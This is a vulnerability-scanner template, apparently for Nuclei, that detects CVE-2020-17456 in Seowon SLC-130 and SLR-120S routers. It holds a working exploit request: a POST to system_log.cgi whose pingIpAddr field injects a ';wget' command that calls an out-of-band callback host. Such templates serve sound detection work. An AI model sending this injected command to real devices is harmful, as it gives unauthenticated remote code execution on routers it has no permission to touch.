id: CVE-2020-17456

info:
  name: Seowon SlC-130 And SLR-120S - Unauthenticated Remote Code Execution
  author: gy741
  severity: critical
  description: SEOWON INTECH SLC-130 And SLR-120S devices allow Remote Code Execution via the ipAddr parameter to the system_log.cgi page.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-17456
    - https://maj0rmil4d.github.io/Seowon-SlC-130-And-SLR-120S-Exploit/
  tags: rce,seowon,router,unauth,iot

requests:
  - raw:
      - |
        POST /cgi-bin/system_log.cgi HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive
        Content-Type: application/x-www-form-urlencoded

        Command=Diagnostic&traceMode=ping&reportIpOnly=&pingIpAddr=;wget http://{{interactsh-url}}&pingPktSize=56&pingTimeout=30&pingCount=4&maxTTLCnt=30&queriesCnt=3&reportIpOnlyCheckbox=on&logarea=com.cgi&btnApply=Apply&T=1646950471018

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
